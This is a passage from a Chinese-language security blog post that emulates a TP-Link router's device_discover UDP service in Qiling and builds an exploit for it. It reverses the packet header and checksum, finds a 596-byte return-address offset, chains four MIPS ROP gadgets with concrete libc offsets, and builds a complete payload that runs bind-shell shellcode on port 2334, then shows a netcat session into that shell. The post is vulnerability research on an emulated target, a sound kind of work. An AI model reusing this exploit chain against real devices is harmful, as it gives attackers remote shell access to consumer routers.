+</span></span></code></pre></div><p>或者hijack掉sendto函数也行</p>
+<pre tabindex="0"><code>def my_sendto(ql: Qiling):
+    return 0
+ql.os.set_api(&#39;sendto&#39;, my_sendto,QL_INTERCEPT.CALL)
+</code></pre></li>
+</ol>
+<p>完成上述步骤之后基本完成了对 device_discover 的仿真，设备会开启udp 端口5001，并对接受的数据进行解析。</p>
+<pre tabindex="0"><code>&gt; lsof -i:5001                         
+COMMAND    PID  USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
+python3 381302 chiba    3u  IPv4 638722      0t0  UDP localhost:5001
+
+
+[+] 	bind(3,127.0.0.1:5001,16) = 0
+[+] 	syscall bind host: 127.[+] 	recvfrom() CONTENT:
+[+] 	b&#39;aaaaaaaaaa\n&#39;
+[+] 	recvfrom() addr is 127.0.0.1:496260.0.1 and port: 5001 sin_family: 2
+</code></pre><p>如果单纯测试数据处理函数protocol_handler，那么可以直接跳转到protocol_handler进行仿真。</p>
+<h2 id="exp-编写">exp 编写<a hidden class="anchor" aria-hidden="true" href="#exp-编写">#</a></h2>
+<p>具体见 <a href="https://github.com/chibataiki/IoT_emulating/blob/main/ql_tplink_device_discover/poc.py">https://github.com/chibataiki/IoT_emulating/blob/main/ql_tplink_device_discover/poc.py</a></p>
+<h3 id="逆向协议结构">逆向协议结构<a hidden class="anchor" aria-hidden="true" href="#逆向协议结构">#</a></h3>
+<p>上面讲过，函数protocol_handler对输入的udp数据有校验和chksum，所以要先逆向出对应算法</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>data <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>a3 )
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>data <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  v5 <span style="color:#f92672">=</span> data[<span style="color:#ae81ff">1</span>];
+</span></span><span style="display:flex;"><span>  v6 <span style="color:#f92672">=</span> v5 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  v7 <span style="color:#f92672">=</span> v5 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( v6 )
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  v6 <span style="color:#f92672">=</span> <span style="color:#f92672">!</span>v7;
+</span></span><span style="display:flex;"><span>  result <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v6 )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( data[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xE</span> )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      v8 <span style="color:#f92672">=</span> data[<span style="color:#ae81ff">11</span>] <span style="color:#f92672">|</span> (data[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span>      result <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( v8 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x5C1</span> )
+</span></span><span style="display:flex;"><span>      {
+</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>((_DWORD <span style="color:#f92672">*</span>)data <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xE12B83C7</span> )
+</span></span></code></pre></div><p>可以推测出大概的data 结构，其中tmp_chksum 和 tmp_len需要根据后面的tlv 数据生成</p>
+<pre tabindex="0"><code>    header = &#34;01010e00e12b83c7&#34;
+    tmp_chksum = &#34;0000&#34;
+    tmp_len = 0
+    padding = &#34;0000&#34;
+    
+    tlv data 
+    
+</code></pre><p>数据校验逻辑：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>((_DWORD <span style="color:#f92672">*</span>)data <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xE12B83C7</span> )
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>          data_len <span style="color:#f92672">=</span> tlv_data_len <span style="color:#f92672">+</span> <span style="color:#ae81ff">14</span>;
+</span></span><span style="display:flex;"><span>          ptr <span style="color:#f92672">=</span> data;
+</span></span><span style="display:flex;"><span>          left_len <span style="color:#f92672">=</span> data_len;
+</span></span><span style="display:flex;"><span>          sum <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>          v13 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>          {
+</span></span><span style="display:flex;"><span>            v13 <span style="color:#f92672">+=</span> <span style="color:#ae81ff">2</span>;
+</span></span><span style="display:flex;"><span>            sum <span style="color:#f92672">+=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int16</span> <span style="color:#f92672">*</span>)ptr;
+</span></span><span style="display:flex;"><span>            ptr <span style="color:#f92672">+=</span> <span style="color:#ae81ff">2</span>;
+</span></span><span style="display:flex;"><span>            left_len <span style="color:#f92672">-=</span> <span style="color:#ae81ff">2</span>;
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">while</span> ( (<span style="color:#66d9ef">int</span>)(data_len <span style="color:#f92672">-</span> v13) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">2</span> );
+</span></span><span style="display:flex;"><span>          v14 <span style="color:#f92672">=</span> HIWORD(sum);
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( left_len <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">goto</span> LABEL_18;
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">for</span> ( sum <span style="color:#f92672">+=</span> <span style="color:#f92672">*</span>ptr; ; sum <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int16</span>)sum <span style="color:#f92672">+</span> v14 )
+</span></span><span style="display:flex;"><span>          {
+</span></span><span style="display:flex;"><span>            v14 <span style="color:#f92672">=</span> HIWORD(sum);
+</span></span><span style="display:flex;"><span>LABEL_18:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v14 )
+</span></span><span style="display:flex;"><span>              <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int16</span>)sum <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xFFFF</span> )
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> ms_idle_handler(a1, data, <span style="color:#ae81ff">1</span>, a3);
+</span></span></code></pre></div><p>上面的 do while 和 for 函数的逻辑就是chksum 函数。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">csum</span>(data):
+</span></span><span style="display:flex;"><span>    chksum_temp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    data_list <span style="color:#f92672">=</span> [data[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(data), <span style="color:#ae81ff">4</span> ) ]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> data <span style="color:#f92672">in</span> data_list:
+</span></span><span style="display:flex;"><span>        chksum_temp <span style="color:#f92672">+=</span> int(data, <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>    hiword_chksumm, loword_chksum <span style="color:#f92672">=</span> divmod(chksum_temp, <span style="color:#ae81ff">0x10000</span>)
+</span></span><span style="display:flex;"><span>    chksum_temp <span style="color:#f92672">=</span> hiword_chksumm<span style="color:#f92672">+</span>loword_chksum
+</span></span><span style="display:flex;"><span>    chksum_fin <span style="color:#f92672">=</span> hex(chksum_temp <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xffff</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> chksum_fin
+</span></span></code></pre></div><h3 id="构造rop">构造rop<a hidden class="anchor" aria-hidden="true" href="#构造rop">#</a></h3>
+<ul>
+<li>
+<p>确定 ra 的偏移</p>
+<p>使用pwntool的 cyclic</p>
+<pre tabindex="0"><code>payload = cyclic(1000, n=4) 
+
+pwndbg&gt; i r ra
+ra: 0x79616166 (&#39;yaaf&#39;)
+
+In [5]: cyclic_find(&#34;yaaf&#34;,n=4)
+Out[5]: 596
+</code></pre><p>偏移是 596 个字节</p>
+</li>
+<li>
+<p>gadaget 1</p>
+<p>找出给 $a0赋值的指令</p>
+<pre tabindex="0"><code>Python&gt;mipsrop.find(&#34;li $a0,1&#34;)
+---------------------------------------------
+|  Address     |  Action   |  Control Jump   |
+---------------------------------------------
+|  0x000512C0  |  li $a0,1     |  jalr  $s1  |
+...
+</code></pre><p>第一个 gadaget， 将 $ra 值 指向   000512C0 + base addr</p>
+<pre tabindex="0"><code>.text:000512C0                 li      $a0, 1
+.text:000512C4                 move    $t9, $s1
+.text:000512C8                 jalr    $t9 ; sub_50FC0
+</code></pre></li>
+<li>
+<p>gadaget 2</p>
+<p>由于 $s1 寄存器可控，所以第二个gadget 会执行 sleep 函数, 但是为了下一个 gadget，所以需要控制 $ra。</p>
+<pre tabindex="0"><code>Python&gt;mipsrop.tail()
+---------------------------------------------
+|  Address     |  Action   |  Control Jump   |
+---------------------------------------------
+|  0x00035348  |  move $t9,$s2    |  jr    $s2 
+...
+</code></pre><p>可以看到下面的$ra的值可以从栈上获取，且$s2 也可以控制</p>
+<pre tabindex="0"><code>.text:00035348                 move    $t9, $s2
+.text:0003534C                 lw      $ra, 0x18+var_sC($sp)
+.text:00035350                 lw      $s2, 0x18+var_s8($sp)
+.text:00035354                 lw      $s1, 0x18+var_s4($sp)
+.text:00035358                 lw      $s0, 0x18+var_s0($sp)
+.text:0003535C                 jr      $t9 ; 
+</code></pre><p>由于需要执行sleep 函数 ，所以 $s2的值设置为sleep 函数地址 000500F0 +  base addr</p>
+</li>
+<li>
+<p>gadget 3</p>
+<p>上面已经执行完sleep(), 并控制了新的 $ra，所以需要找一个将从stack中取值的的gadget</p>
+<pre tabindex="0"><code>Python&gt;mipsrop.stackfinder()
+---------------------------------------------
+|  Address     |  Action   |  Control Jump   |
+---------------------------------------------
+|  0x000305B0  |  addiu $s3,$sp,0x30+var_18 |  jalr  $s4
+...
+</code></pre><p>其中 $s3 从栈上获取，对应的就是栈上的shellcode 地址 ，且 $s4 可控。</p>
+<pre tabindex="0"><code>.text:000305B0                 addiu   $s3, $sp, 0x30+var_18
+.text:000305B4                 move    $a0, $s3
+.text:000305B8                 move    $t9, $s4
+.text:000305BC                 jalr    $t9 ; 
+.text:000305C0                 move    $a1, $s1
+</code></pre></li>
+<li>
+<p>gadget 4</p>
+<p>上面可以看到 $s3 指向了shellcode 地址，那么 $s4 指向的gadget 就需要执行$s3</p>
+<pre tabindex="0"><code>Python&gt;mipsrop.find(&#34;move $t9, $s3&#34;)
+---------------------------------------------
+|  Address     |  Action   |  Control Jump   |
+---------------------------------------------
+|  0x0000B5F0  |  move $t9,$s3  |  jalr  $s3 
+...
+</code></pre><pre tabindex="0"><code>.text:0000B5F0                 move    $t9, $s3
+.text:0000B5F4                 jalr    $t9
+.text:0000B5F8                 move    $a1, $s0
+</code></pre><p>这里$s4 就为 0x000B5F0 + base addr</p>
+</li>
+<li>
+<p>gadget chain</p>
+<pre tabindex="0"><code>
+shellcode = asm(shellcraft.mips.linux.bindsh(2334))
+libc_addr = 0x90063000
+addr1 =  0x000512C0
+addr2 = 0x00035348
+addr_sleep = 0x000500F0
+addr3 = 0x000305B0
+addr4 = 0x0000B5F0
+s1 = p32(libc_addr + addr2 )
+s2 = p32(libc_addr + addr_sleep)
+s3 = b&#34;BBBB&#34;
+s4 = p32(libc_addr + addr4)
+ra = p32(libc_addr+addr1)
+
+payload = b&#34;A&#34;*580 + s1 + s2 + s3 + s4 + ra + b&#34;A&#34;*36 + p32(libc_addr+addr3)+ b&#34;D&#34;*24+shellcode
+</code></pre></li>
+</ul>
+<h3 id="效果">效果<a hidden class="anchor" aria-hidden="true" href="#效果">#</a></h3>
+<p>暂时需要使用 qiling 的debug模式，结合gdb ，忽视掉一些</p>
+<p><code>unicorn.unicorn.UcError: Invalid memory write (UC_ERR_WRITE_UNMAPPED)</code> 问题。</p>
+<p>已经执行到shellcode里了，但是有点小问题。</p>
+<pre tabindex="0"><code>[+] 	bind(5,127.0.0.1:2334,16) = 0
+[+] 	syscall bind host: 127.0.0.1 and port: 2334 sin_family: 2
+...
+[+] 	write() CONTENT: b&#39;ls&#39;
+[+] 	write() CONTENT: b&#39;Permission denied&#39;
+
+
+&gt; lsof -i:2334                                                                                         
+COMMAND    PID  USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
+python3 417496 chiba   13u  IPv4 695587      0t0  TCP localhost:2334 (LISTEN)
+python3 417496 chiba   14u  IPv4 695588      0t0  TCP localhost:2334-&gt;localhost:43394 (ESTABLISHED)
+
+
+$ nc 127.0.0.1 2334                                                                             exit 130
+ls
+sh: ls: Permission denied
+pwd
+/
+help
+
+Built-in commands:
+-------------------
+	. : alias bg break cd chdir continue eval exec exit export false
+	fg hash help jobs kill let local pwd read readonly return set
+	shift times trap true type ulimit umask unalias unset wait
+</code></pre><p><a href="https://github.com/77clearlove/TP-Link-poc">https://github.com/77clearlove/TP-Link-poc</a></p>
+<p><a href="https://github.com/chibataiki/IoT_emulating/tree/main/ql_tplink_device_discover">https://github.com/chibataiki/IoT_emulating/tree/main/ql_tplink_device_discover</a></p>
+<p><a href="https://gsec.hitb.org/materials/sg2015/whitepapers/Lyon%20Yang%20-%20Advanced%20SOHO%20Router%20Exploitation.pdf">https://gsec.hitb.org/materials/sg2015/whitepapers/Lyon%20Yang%20-%20Advanced%20SOHO%20Router%20Exploitation.pdf</a></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://chibataiki.github.io/tags/qiling/">qiling</a></li>
+      <li><a href="https://chibataiki.github.io/tags/iot/">IoT</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="https://chibataiki.github.io/posts/firmware_emulation_tools/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Firmware emulation tools</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2022 <a href="https://chibataiki.github.io/">JiansLife</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
